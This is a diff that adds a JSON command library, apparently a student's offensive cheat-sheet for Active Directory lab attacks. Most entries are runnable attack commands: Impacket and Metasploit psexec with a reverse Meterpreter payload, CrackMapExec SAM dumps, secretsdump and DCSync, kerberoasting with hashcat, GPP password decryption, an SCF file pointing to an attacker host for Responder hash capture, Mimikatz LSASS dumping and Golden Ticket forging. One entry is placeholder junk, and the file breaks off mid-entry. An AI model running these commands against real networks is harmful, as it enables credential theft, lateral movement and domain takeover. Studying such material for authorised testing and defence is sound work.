@@ -1,0 +1,720 @@
+[
+  {
+    "id": "87cb075c-f935-4e66-be0f-ba74c3779dd3",
+    "label": "Get All Domain Users  with PowerView",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-DomainUser -Properties name,badpwdcount",
+    "description": "<p>List Properties of Users, in this case, select name and badpwdcount.</p><p></p>",
+    "tags": [
+      "AD",
+      "PowerView",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "f2aaae82-f409-4085-8b52-911563b222f1",
+    "label": "Get All Domain Computers , using PowerView",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetComputer | select operatingsystem,operatingsystemversion",
+    "description": "<p>list operatingSystem</p>",
+    "tags": [
+      "AD_Enumeration",
+      "PowerView",
+      "AD",
+      "ASREPRoast"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "608e8893-525f-4f36-b970-fcb96c5784a4",
+    "label": "PowerView Groups",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetGroupMember",
+    "description": "<p>find members of a group</p>",
+    "tags": [
+      "AD",
+      "PowerView",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "ca5ddf74-e52b-4d2f-a712-2839ae4d2170",
+    "label": "PowerView GPO",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetGPO\nPS> Get-NetGPO | select displayname, whenchanged",
+    "description": "<p>list GPO policies, and their infos</p>",
+    "tags": [
+      "AD",
+      "PowerView",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "fe4ee290-5074-490a-893e-c28dc1e5206e",
+    "label": "PowerShell fixColors",
+    "command": "Remove-Module PSReadLine",
+    "description": "Fixe text not showing when changing fonts background in windows cmd or gitbash terminals",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#412525"
+  },
+  {
+    "id": "8006fb10-b455-4c4f-b09f-14dc4fc1765c",
+    "label": "PowerView Share",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetShare -ComputerName Spiderman",
+    "description": "<p>Get shares on specific computer</p>",
+    "tags": [
+      "AD",
+      "PowerView",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "57afea04-0c96-4303-a890-8e2860b9d19e",
+    "label": "Collect data with SharpHound & Run it with neoj and Bloodhound",
+    "command": "# Data Collection with SharpHound (zip file)\n\nPS>  Import-Module .\\Sharphound.ps1\nPS>  Get-Help Invoke-BloodHound\nPS>  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\\ -OutputPrefix \"corp audit\"\n\n# Move zip to Kali and Starting BloodHound\n\nsudo neo4j start\n\n# now connect to http://localhost:7474 , default credential neo4j/neo4j , then set the new password and remember it\n\nbloodhound\n\n\n",
+    "description": "<p>Steps to collect data with bloodhound, and move it for analysis in kali </p>",
+    "tags": [
+      "AD",
+      "AD_Enumeration",
+      "BloodHound"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "c2a161a8-078f-4fc1-a4ab-03d9b7456521",
+    "label": "simple info",
+    "command": "whoami\nwhoami /user\nwhoami /groups\necho USERNAME=%USERNAME%\necho USERDOMAIN=%USERDOMAIN%\necho LOGONSERVER=%LOGONSERVER%",
+    "description": "",
+    "tags": [
+      "Windows"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "dc0c193c-e0fe-4129-8f09-954df7e30b52",
+    "label": "Domain join and machine role",
+    "command": "systeminfo | findstr /B /C:\"Host Name\" /C:\"Domain\" /C:\"Logon Server\"\nwmic computersystem get name,domain,partofdomain,domainrole\n",
+    "description": "",
+    "tags": [
+      "Windows"
+    ]
+  },
+  {
+    "id": "a1c8771a-3c54-43df-b0ce-57cc75e69a6c",
+    "label": "local users",
+    "command": "net user\nwmic useraccount where \"LocalAccount=True\" get Name,SID,Disabled\n",
+    "description": "",
+    "tags": [
+      "Windows"
+    ]
+  },
+  {
+    "id": "9de831a1-ad09-4477-9d60-84befe568dc8",
+    "label": "local admins",
+    "command": "net localgroup administrators",
+    "description": "",
+    "tags": [
+      "Windows",
+      "AD_Enumeration",
+      "AD"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "47776de2-cdd3-49dd-8660-6d387673164b",
+    "label": "Shell on windows via Impacket PsExec",
+    "command": "# --- OPTION A: Impacket (Quickest Standalone Shell) ---\n\n# Option 1. Standard Login (Password)\n# Syntax: domain/username:password@IP\nimpacket-psexec 'MARVEL/fcastle:Password1@10.0.2.73'\n\n# Option 2. Pass-The-Hash (PTH)\n# If you only have the NTLM hash. Syntax: -hashes :<NTLM>\nimpacket-psexec -hashes :c39f2beb3d2ec06a62cb887fb391dee0 MARVEL/fcastle@10.0.2.73\n\n\n# --- OPTION B: Metasploit (Best for Pivoting/Meterpreter) ---\n\n# Start console\nmsfconsole -q\n\n# Load the module\nuse exploit/windows/smb/psexec\n\n# Configure Target & Credentials\nset RHOSTS 10.0.2.73\nset SMBUser fcastle\nset SMBDomain MARVEL.LOCAL\n# For Password:\nset SMBPass Password1\n# OR for Pass-The-Hash (Format is LM:NTLM, generally replace empty LM with 32 zeros):\n# set SMBPass 00000000000000000000000000000000:c39f2beb3d2ec06a62cb887fb391dee0\n\n# Configure Payload (Optional, defaults to meterpreter)\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST tun0\n\n# Execute\nrun",
+    "description": "<ul><li><p>The standard technique for lateral movement using valid credentials (password or hash) over&nbsp;<strong>SMB</strong>&nbsp;(Port 445).</p></li><li><p><strong>Mechanism:</strong>&nbsp;Uploads a random executable (service binary) to the&nbsp;<code>ADMIN$</code>&nbsp;share, registers it as a Windows Service, and executes it.</p></li><li><p><strong>Privileges:</strong>&nbsp;Grants&nbsp;<strong>NT AUTHORITY\\SYSTEM</strong>&nbsp;access immediately (highest level), unlike WinRM which restricts you to the user's level.</p></li><li><p><strong>Detection:</strong>&nbsp;High profile. It creates Event ID 7045 (Service Creation) and drops files on the disk.</p></li><li><p><strong>Metasploit Variant:</strong>&nbsp;Useful for automating the attack and immediately catching a&nbsp;<strong>Meterpreter</strong>&nbsp;shell for post-exploitation (screenshare, keylogging, pivoting).</p></li></ul><p></p>",
+    "tags": [
+      "RCE",
+      "Impacket",
+      "Metasploit",
+      "Lateral_Movement",
+      "SMB",
+      "Pass_The_Hash",
+      "Windows",
+      "Psexec"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "4a696c60-541f-4649-9e77-12c922425fa1",
+    "label": "CME SAM Dump , Users  (list or one) / passwords attacks with crackmapexec",
+    "command": "crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1 --sam\n\ncrackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --\ncontinue-on-success\n\n",
+    "description": "<p>Scans the specified subnet via the SMB protocol and attempts to authenticate to each host using the provided domain credentials. If the account has local administrator privileges on a target, it extracts the Security Account Manager (SAM) database. This reveals NTLM hashes for local user accounts (including the local Administrator), which can be used for offline cracking or Pass-the-Hash attacks.</p><p></p><p>note about Pwn3d !</p><p></p><img src=\"local-file://profile-assets/offensive/30f99280-62a9-4ec6-878b-c79d571407a5.png\" alt=\"Pasted Image\"><p></p>",
+    "tags": [
+      "AD",
+      "Windows",
+      "CrackMapExec",
+      "Credential_Dumping",
+      "SMB",
+      "AD_Attacking",
+      "Windows_Attacking"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "14fd4027-5df3-40a5-8c95-76e21adb7a01",
+    "label": "DC Sync  Remotely dump local and domain password hashes.",
+    "command": "# 1. Basic remote dump of SAM, LSA, and cached credentials using cleartext password\nimpacket-secretsdump -system SYSTEM_HIVE -sam SAM_HIVE -security SECURITY_HIVE LOCAL\nimpacket-secretsdump marvel/fcastle:Password1@10.0.2.72\n\n# 2. Remote dump using NTLM hash (Pass-the-Hash)\n# Format: -hashes [LM]:NTLM\nimpacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 marvel/fcastle@10.0.2.72\n\n# 3. Perform a DCSync attack against a Domain Controller to dump all domain hashes\n# Requires Domain Admin-level privileges\nimpacket-secretsdump -just-dc-ntlm marvel/fcastle:Password1@10.0.2.72\n\n# 4. Dump LSA secrets specifically\nimpacket-secretsdump -history -users-retrieved users.txt marvel/fcastle:Password1@10.0.2.72",
+    "description": "<h3>1. Tool &amp; Attack Description</h3><p>The <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-secretsdump</strong></span> tool is a powerful, agentless python script used for performing <strong>Remote Credential Dumping</strong>. It is part of the widely acclaimed <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket</strong></span> library. The attack vector involves authenticating to a remote Windows target via <span style=\"color: rgb(59, 130, 246);\">SMB (TCP 445)</span> and extracting sensitive information from the registry hives or the <span style=\"color: rgb(251, 191, 36);\"><strong>NTDS.dit</strong></span> database. Unlike many tools that require local execution or memory injection, this tool performs the heavy lifting by reading files or using RPC calls, making it a \"living off the land\" favorite for lateral movement. It can extract NTLM hashes, plaintext LSA secrets, and cached domain credentials. When targeted at a Domain Controller, it can perform a <strong>DCSync</strong> attack to replicate all domain user hashes.</p><h3>2. Tool Location/Source</h3><p>In <strong>Kali Linux</strong>, the tool is pre-installed and can be found at <span style=\"color: rgb(239, 68, 68);\"><strong>/usr/bin/impacket-secretsdump</strong></span>. The source code and latest updates are maintained on the <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/fortra/impacket\">Official Impacket GitHub</a>.</p><h3>3. Attack Prerequisites</h3><ul><li><p><strong>Valid Administrative Credentials:</strong> Local Admin rights on a workstation or Domain Admin rights for DCSync.</p></li><li><p><strong>Network Accessibility:</strong> Unrestricted access to <span style=\"color: rgb(59, 130, 246);\">SMB (TCP 445)</span> on the target machine.</p></li><li><p><strong>Remote Services:</strong> The Service Control Manager (SCM) must be reachable to enable the <strong>Remote Registry</strong> service if it is not already running.</p></li></ul><h3>4. How Attack Works (Step-by-Step)</h3><ol><li><p>The attacker initiates an <span style=\"color: rgb(59, 130, 246);\">SMB</span> connection to the target using compromised credentials.</p></li><li><p>The tool checks for the <strong>Remote Registry</strong> service; if disabled, it attempts to start it via RPC calls to the SCM.</p></li><li><p>It utilizes the <code>RegSaveKey</code> operation to save the <strong>SAM</strong>, <strong>SECURITY</strong>, and <strong>SYSTEM</strong> hives to temporary files in <code>C:\\Windows\\Temp&lt;/code&gt;.</code></p></li><li><p><code>The SYSTEM hive is parsed to extract the Boot Key (Syskey), which is necessary to decrypt the other hives.</code></p></li><li><p><code>The tool transfers the hive files back to the attacker's machine over SMB for offline parsing.</code></p></li><li><p><code>If the target is a Domain Controller, the tool uses the DRSUAPI protocol to perform a DCSync, requesting account data via replication.</code></p></li><li><p><code>Temporary files are deleted from the target filesystem to minimize the forensic footprint.</code></p></li></ol><h3><code>5. What Attacker Gains</code></h3><ul><li><p><code>NTLM Hashes: Enables Pass-the-Hash (PtH) attacks for lateral movement.</code></p></li><li><p><code>LSA Secrets: Extraction of service account passwords, often stored in plaintext.</code></p></li><li><p><code>Domain-wide Credentials: Full access to all domain hashes (including krbtgt) if performed against a DC.</code></p></li></ul><h3><code>6. Detection/Defense/OPSEC</code></h3><ul><li><p><code>Event ID 7036: Monitor for unexpected starting of the \"Remote Registry\" service.</code></p></li><li><p><code>File Monitoring: Alert on creation/deletion of .tmp or .save files in C:\\Windows\\Temp&lt;/code&gt;.</code></p></li><li><p><code>DCSync Detection: Audit Event ID 4662 for non-DC accounts requesting replication rights.</code></p></li></ul><h3><code>7. MITRE / OWASP Category</code></h3><ul><li><p><code>MITRE T1003: OS Credential Dumping.</code></p></li><li><p><code>MITRE T1003.002: Security Account Manager.</code></p></li><li><p><code>MITRE T1003.004: LSA Secrets.</code></p></li><li><p><code>MITRE T1003.006: NTDS.</code></p></li></ul><p></p><img src=\"local-file://profile-assets/offensive/0cc71676-fc68-4b2a-920f-61f69415eb23.png\" alt=\"Pasted Image\"><p></p>",
+    "tags": [
+      "AD",
+      "NTLM",
+      "Credential_Dumping",
+      "Impacket",
+      "Remote_Registry",
+      "Post-Exploitation",
+      "SAM",
+      "LSA",
+      "DCSync",
+      "Windows",
+      "SMB"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "54303b37-bb70-4709-8096-96b6691e86e3",
+    "label": "Hashcat NTLM Cracking",
+    "command": "hashcat -m 1000 ~/AD-CyberMentor/hashes.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable",
+    "description": "Performs a dictionary-based cracking attack against NTLM hashes (mode 1000) utilizing the RockYou wordlist. This mode is specifically used for Windows hashes typically harvested from the SAM database or NTDS.dit via tools like impacket-secretsdump. The -O flag enables optimized kernels for higher performance (at the cost of limiting password length), while --potfile-disable prevents saving cracked credentials to the local history. This is the standard offline method for recovering plaintext passwords from captured Windows hashes.",
+    "tags": [
+      "Password_Cracking",
+      "Hashcat",
+      "NTLM"
+    ],
+    "color": "#f07c0f"
+  },
+  {
+    "id": "596f3c62-c3db-4ccf-a046-88c7fa444c52",
+    "label": "CME Local Pass-The-Hash",
+    "command": "crackmapexec smb 10.0.2.0/24 -u \"Frank Castle\" -H 64f12cddaa88057e06a81b54e73b949b --local-auth",
+    "description": "Uses the Pass-the-Hash technique to authenticate against a range of IP addresses via SMB using a specific NTLM hash instead of a password. The --local-auth flag forces the tool to validate credentials against the local SAM database of each target rather than a Domain Controller. This is essential for detecting local administrator password reuse across different machines in a network without needing the plaintext password.",
+    "tags": [
+      "AD",
+      "Windows",
+      "CrackMapExec",
+      "Pass_The_Hash",
+      "Lateral_Movement"
+    ]
+  },
+  {
+    "id": "b0dc3db7-f25e-46f5-a12d-6b01510ccc33",
+    "label": "Meterpreter PsExec Hashdump",
+    "command": "use exploit/windows/smb/psexec\nset smbdomain marvel.local\nset smbuser / password / rhosts / hosts\nrun\nhashdump",
+    "description": "Initiates the Metasploit Framework to perform lateral movement using the exploit/windows/smb/psexec module. This requires valid credentials to authenticate via SMB and execute a payload through the Service Control Manager, typically yielding a SYSTEM-level Meterpreter session. Once the session is established, the hashdump command attempts to extract NTLM hashes from the local SAM database. This sequence combines remote code execution with immediate credential harvesting for further pivoting.",
+    "tags": [
+      "Metasploit",
+      "Windows",
+      "SMB",
+      "Lateral_Movement",
+      "Credential_Dumping",
+      "AD"
+    ],
+    "color": "#d79365"
+  },
+  {
+    "id": "68243b8d-2329-4034-89f6-1c61b5e3e154",
+    "label": "Meterpreter Incognito Token Impersonate",
+    "command": "use exploit/windows/smb/psexec \nset smbdomain / smbuser / password / rhosts / hosts.. \nrun \nload incognito \nlist_tokens -u \nimpersonate_token marvel\\\\fcastle ",
+    "description": "Leverages a Metasploit Meterpreter session (established via psexec) to perform Token Impersonation attacks using the incognito extension. After listing available user tokens with list_tokens -u, the impersonate_token command is used to hijack the security context of a different logged-in user (e.g., marvel\\fcastle) without knowing their password. This allows for immediate privilege escalation or lateral movement if the target token has higher privileges or domain access. Note that when specifying the domain user, you must use a double backslash (\\\\) to properly escape the backslash character.",
+    "tags": [
+      "Metasploit",
+      "Windows",
+      "Privilege_Escalation",
+      "Token_Impersonation",
+      "Incognito"
+    ],
+    "color": "#f2b269"
+  },
+  {
+    "id": "1683df92-f908-45c7-b235-12d9cc48fe84",
+    "label": "net.exe AD enumeration",
+    "command": "net user / domain\nnet user jeffadmin /domain\nnet group /domain\nnet group \"Sales Department\" /domain",
+    "description": "manual enumeration using default net.exe binary in win10 client",
+    "tags": [
+      "AD",
+      "net.exe"
+    ],
+    "color": "#6ddcf8"
+  },
+  {
+    "id": "4ec3ee4b-c2dc-40b4-b9b6-57d521be0a36",
+    "label": "find ADsPath for manual enumeration with LDAP and .Net",
+    "command": "$PDC = [[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName\n$LDAP = \"LDAP://$PDC/$DN\"",
+    "description": "",
+    "tags": [
+      "AD",
+      "PowerShell",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "27a7fec8-c0a8-4a8c-a0bb-fce439ec80b5",
+    "label": "Search for all properties of users objects",
+    "command": "$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = $domainObj.PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName\n$LDAP = \"LDAP://$PDC/$DN\"\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"samAccountType=805306368\"\n$result = $dirsearcher.FindAll()\nForeach($obj in $result)\n{\nForeach($prop in $obj.Properties)\n{\n$prop\n}\nWrite-Host \"-------------------------------\"\n}\n",
+    "description": "",
+    "tags": [
+      "AD",
+      "PowerShell",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "428f136c-d8c2-4fbc-a062-ae89cb7a9980",
+    "label": "run powershell script",
+    "command": "powershell -ep bypass\n.\\enumeration.ps1",
+    "description": "",
+    "tags": [
+      "AD",
+      "PowerShell",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "97784acb-ff9f-43f6-871b-d1b0898e04a7",
+    "label": "search groups member of a User",
+    "command": "$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"name=jeffadmin\"\n$result = $dirsearcher.FindAll()\nForeach($obj in $result)\n{\nForeach($prop in $obj.Properties)\n{\n$prop.memberof\n}\nWrite-Host \"-------------------------------\"\n}\n\n",
+    "description": "",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#d4ea34"
+  },
+  {
+    "id": "9b6a9c14-45bd-4879-94e8-45a6ff6135e3",
+    "label": "Expose Filters as Argument: Then search by samAccountType, groups, members of group, ..",
+    "command": "\n1) Expose Filters as Argument: Then search by samAccountType users\n\nfunction LDAPSearch {\nparam (\n[string]$LDAPQuery\n)\n$PDC =\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DistinguishedName = ([adsi]'').distinguishedName\n$DirectoryEntry = New-Object\nSystem.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DistinguishedName\")\n$DirectorySearcher = New-Object\nSystem.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)\nreturn $DirectorySearcher.FindAll()\n}\n\n2) To run it :\n\nPS > Import-Module .\\function.ps1\nPS > LDAPSearch -LDAPQuery \"(samAccountType=805306368)\"\n\n3) Search by object type (group in this case)\nPS > LDAPSearch -LDAPQuery \"(objectclass=group)\"\n\n>> This for instane can enumerate more groups than net.exe\n\n4) Enumerate every group, with user members \nPS>  foreach ($group in $(LDAPSearch -LDAPQuery\n\"(objectCategory=group)\")) {\n>> $group.properties | select {$_.cn}, {$_.member}\n>> }\n",
+    "description": "",
+    "tags": [
+      "AD",
+      "PowerShell",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "18878974-d303-4719-8b91-ae569227afde",
+    "label": "find machines in domain that current user as admin privileges on",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Find-LocalAdminAccess",
+    "description": "",
+    "tags": [
+      "AD",
+      "PowerView",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "a32203e2-7cd0-43eb-ace3-0c137b81933d",
+    "label": "find loggedin users to machine",
+    "command": "PS> Get-NetSession -ComputerName COMPUTERNAME -Verbose",
+    "description": "",
+    "tags": [
+      "AD",
+      "PowerView",
+      "AD_Enumeration"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "a39c5614-0a80-4fcc-b047-dc022751f97e",
+    "label": "test feature",
+    "command": "yo yow",
+    "description": "<h1>asdfasdf</h1><img src=\"local-file://profile-assets/myoscp/7a60a02d-91e2-4813-bf3d-6dcc698b54f0.png\" alt=\"Pasted Image\"><p><span style=\"background-color: rgb(217, 249, 157);\">asdfasdfasdf</span></p><p>asdfasdf</p>",
+    "tags": [],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "c5949ffd-ce05-4b8b-89a4-a37883de987f",
+    "label": "kerberoasting service (SPN) hash cracking with impacket",
+    "command": "impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 10.0.2.71 -request\n\nhashcat -m 13100 ~/AD-CyberMentor/Kerberoasting/service_hash.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable",
+    "description": "<img src=\"local-file://profile-assets/myoscp/0c2c9d93-e13a-4666-a104-1b6952879ae6.png\" alt=\"Pasted Image\"><ul><li><p>step 1 &amp; 2, are normal authentication</p></li><li><p>app server has SPN, KDC gives TGS for that SPN</p></li><li><p>step3 we ask for TGS for that SPN</p></li><li><p>step4 KDC sends TGS enc with App server Hash , and <span style=\"color: rgb(219, 39, 119);\">appends the App Server</span> Hash!</p></li></ul><p><span style=\"color: rgb(179, 179, 179);\">This sequence executes a standard Kerberoasting attack to compromise Active Directory service accounts,</span></p><p><span style=\"color: rgb(179, 179, 179);\">First,&nbsp;</span><code>impacket-GetUserSPNs</code><span style=\"color: rgb(179, 179, 179);\">&nbsp;queries the Domain Controller for users with Service Principal Names (SPNs) and requests their Ticket Granting Service (TGS) tickets. These tickets are encrypted with the service account's NTLM hash, allowing them to be extracted for offline cracking.</span></p><p><span style=\"color: rgb(179, 179, 179);\">Finally,&nbsp;</span><code>hashcat</code><span style=\"color: rgb(179, 179, 179);\">&nbsp;utilizes mode 13100 to brute-force the captured TGS tickets against a wordlist to recover the plaintext passwords.</span><br><br><span style=\"color: rgb(179, 179, 179);\">Note:</span><br></p><img src=\"local-file://profile-assets/offensive/150becb0-c547-44ec-bef9-982f6052c66f.png\" alt=\"Pasted Image\"><p></p>",
+    "tags": [
+      "AD",
+      "Kerberoasting",
+      "AD_Attacking",
+      "Credential_Dumping"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "0f5f401c-0c43-4960-b9ca-4307a5439f17",
+    "label": "GPP default user/pass cracking (MS14-025)",
+    "command": "crackmapexec smb 10.129.2.16 -u '' -p '' --shares\nsmbclient -L \\\\\\\\10.129.2.16\\\\\nsmbclient -L \\\\\\\\10.129.2.16\\\\Replication\nsmb: \\> prompt off  (remove smb: > )\nsmb: \\> recurse on \nsmb: \\> ls\nsmb: \\> mget *   ( get all files)\n\n#pickup Groups.xml, extract username/password, then crack password:\n\ngpp-decrypt ....password...\n",
+    "description": "<ul><li><p>Targets legacy Group Policy Preferences (GPP) where administrative passwords were historically stored in the&nbsp;<code>SYSVOL</code>share.</p></li><li><p>Involves enumerating SMB shares to locate configuration files like&nbsp;<code>Groups.xml</code>,&nbsp;<code>Services.xml</code>, or&nbsp;<code>ScheduledTasks.xml</code>.</p></li><li><p>The attacker downloads these files and extracts the&nbsp;<code>cpassword</code>&nbsp;attribute.</p></li></ul><img src=\"local-file://profile-assets/myoscp/c18c2bbf-efda-4e3a-9f6d-6c05072b9abf.png\" alt=\"Pasted Image\"><ul><li><p>Although encrypted, the AES key was accidentally published by Microsoft, allowing tools like&nbsp;<code>gpp-decrypt</code>&nbsp;to instantly recover the plaintext credentials.</p></li><li><p>This often results in immediate Local Administrator or Service Account access (MS14-025).</p></li></ul><p></p>",
+    "tags": [
+      "AD",
+      "GPP"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "8c5b6848-b4e3-4716-b468-85395ab35487",
+    "label": "SCF/URL file attack in Share to dump hashes",
+    "command": "1) create file in share with url code (see desc!)\n2) set responder :\nsudo responder -I eth2 -v ( in attacker)",
+    "description": "<ul><li><p>Exploits writable SMB shares by uploading a malicious configuration file (typically&nbsp;<code>.scf</code>,&nbsp;<code>.url</code>, or&nbsp;<code>.lnk</code>).</p></li><li><p>The file contains a directive (like&nbsp;<code>IconFile</code>&nbsp;or&nbsp;<code>scf_icon_path</code>) pointing to the attacker's IP address using a UNC path (e.g.,&nbsp;<code>\\\\Attacker_IP\\share</code>).</p></li><li><p>When a victim (user or automated service) browses that folder, their Windows Explorer attempts to render the icon by authenticating to the attacker's machine.</p></li><li><p><strong>Responder</strong>&nbsp;listens on the attacker's interface to capture the incoming authentication handshake, stealing the user's&nbsp;<strong>NTLMv2 hash</strong>.</p></li><li><p>This hash can then be cracked (Hashcat) or relayed (NTLM Relay) to gain access.</p></li></ul><img src=\"local-file://profile-assets/myoscp/a2a99bae-d5e6-4b10-891c-3be0ef87d4b7.png\" alt=\"Pasted Image\"><p></p>",
+    "tags": [
+      "AD",
+      "SMB",
+      "Credential_Dumping",
+      "Responder",
+      "NTLM",
+      "Lateral_Movement",
+      "Windows"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "7720eb10-1f05-4f70-b080-c539dc0ff5e0",
+    "label": "Mimikatz Credential Dumping (SAM and LSA) (local and cached)",
+    "command": "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::lsa /patch ",
+    "description": "<p>This command sequence is a classic post-exploitation flow to extract credentials from a compromised Windows host using&nbsp;<code>mimikatz</code>.</p><ul><li><p><code>privilege::debug</code>: Enables&nbsp;<code>SeDebugPrivilege</code>, giving mimikatz the necessary rights to interact with the LSASS process.</p></li><li><p><code>sekurlsa::logonpasswords</code>: Extracts plaintext passwords (if available) and NTLM hashes from the LSASS memory for currently logged-on users.</p></li><li><p><code>lsadump::sam</code>: Dumps the local Security Account Manager (SAM) database to retrieve NTLM hashes of local users.</p></li><li><p><code>lsadump::lsa /patch</code>: Extracts LSA secrets (such as service account passwords or cached domain credentials) by patching the memory to bypass protection.</p></li></ul><p></p><p><strong>1. What is SAM (Security Account Manager)?</strong></p><ul><li><p><strong>Definition:</strong>&nbsp;The SAM is a database file in Windows XP and later (usually located at&nbsp;<code>C:\\Windows\\System32\\config\\SAM</code>) that stores users' passwords.</p></li><li><p><strong>Format:</strong>&nbsp;It does not store passwords in plain text; it stores them as NTLM hashes.</p></li><li><p><strong>Pentesting Value:</strong>&nbsp;It contains&nbsp;<strong>Local</strong>&nbsp;user accounts only (e.g., local Administrator). It does&nbsp;<em>not</em>&nbsp;contain Active Directory domain user hashes (those are stored in the&nbsp;<code>NTDS.dit</code>&nbsp;on the Domain Controller).</p></li></ul><p><strong>2. What is LSA (Local Security Authority)?</strong></p><ul><li><p><strong>Definition:</strong>&nbsp;The LSA is a protected subsystem that manages authentication and security policies on Windows. It runs as&nbsp;<code>lsass.exe</code>&nbsp;(Local Security Authority Subsystem Service).</p></li><li><p><strong>Pentesting Value:</strong>&nbsp;The \"LSA Secrets\" stored here are a goldmine for attackers because they often contain:</p><ul><li><p>Passwords for services running as a user.</p></li><li><p><span style=\"color: rgb(220, 38, 38);\">Cached credentials</span> (if a domain admin logged into that machine previously).</p></li><li><p>The Computer account password (used by the machine to trust the domain).</p></li><li><p>Autologon passwords.</p></li></ul></li></ul><p></p>",
+    "tags": [
+      "AD",
+      "Credential_Dumping",
+      "Mimikatz",
+      "Windows",
+      "Post_Exploitation",
+      "LSASS",
+      "AD_Attacking",
+      "Windows_Attacking",
+      "ACE-ACL"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "5b52889d-d3f6-41d0-b924-d80c1f83eb28",
+    "label": "Golden Ticket Attack with Mimikatz",
+    "command": "lsadump::lsa /inject /name:krbtgt\nkerberos::golden /User:Administrator /domain:marvel.local /sid:S1-15-21…. /krbtgt:af… /id:500 /ptt\nmisc::cmd\nthis opens a new CMD with golden ticket,\nthen inside, you can full control of other machines for instance\ndir \\\\THEPUNISHER\\c$\nwill list C file of remote machine THEPUNISHER,\nyou can also download psexec and use it on this cmd to get shell",
+    "description": "<p></p><p><strong>Description:</strong>&nbsp;This flow executes a Golden Ticket attack, forging our own TGS ticket with unrestricted persistence within an Active Directory domain.</p><ul><li><p><strong>Dump Hash:</strong>&nbsp;<code>lsadump::lsa /inject /name:krbtgt</code>&nbsp;dumps the NTLM hash and SID of the&nbsp;<span style=\"color: rgb(220, 38, 38); background-color: rgb(254, 240, 138);\">krbtgt</span>&nbsp;account (the service account that encrypts Kerberos TGTs). This requires Domain Admin privileges initially.</p></li></ul><img src=\"local-file://profile-assets/myoscp/cab6e7b0-37fd-454a-95d8-37a53f618a11.png\" alt=\"Pasted Image\"><ul><li><p><strong>Forge Ticket:</strong>&nbsp;<code>kerberos::golden ... /ptt</code>&nbsp;creates a forged TGT (Ticket Granting Ticket) with a non-expiring lifetime (usually 10 years) and injects it into the current session (\"Pass-The-Ticket\").</p><ul><li><p><code>/id:500</code>&nbsp;impersonates the built-in Administrator.</p></li><li><p><code>/sid</code>: The domain SID (highlighted in your image).</p></li><li><p><code>/krbtgt</code>: The NTLM hash of the krbtgt account (highlighted in your image).</p></li></ul></li><li><p><strong>Use Access:</strong>&nbsp;<code>misc::cmd</code>&nbsp;opens a new command prompt that inherits this forged ticket, allowing you to access any resource in the domain (e.g., listing C$ shares on other machines like&nbsp;<code>\\\\THEPUNISHER</code>) or execute commands remotely via PsExec.</p></li></ul><p><br>Additional Context on Parameters</p><ul><li><p><strong>SID vs. RID:</strong>&nbsp;Notice in&nbsp;<code>kerberos::golden</code>&nbsp;you provide the Domain SID (ending in&nbsp;<code>...608</code>&nbsp;in your image) and the User ID (<code>/id:500</code>&nbsp;for Administrator). The Golden Ticket works because you are manually signing a ticket claiming \"I am User 500\" using the domain's secret key (<code>krbtgt</code>&nbsp;hash).</p></li><li><p><strong>Persistence:</strong>&nbsp;This is primarily a persistence technique. 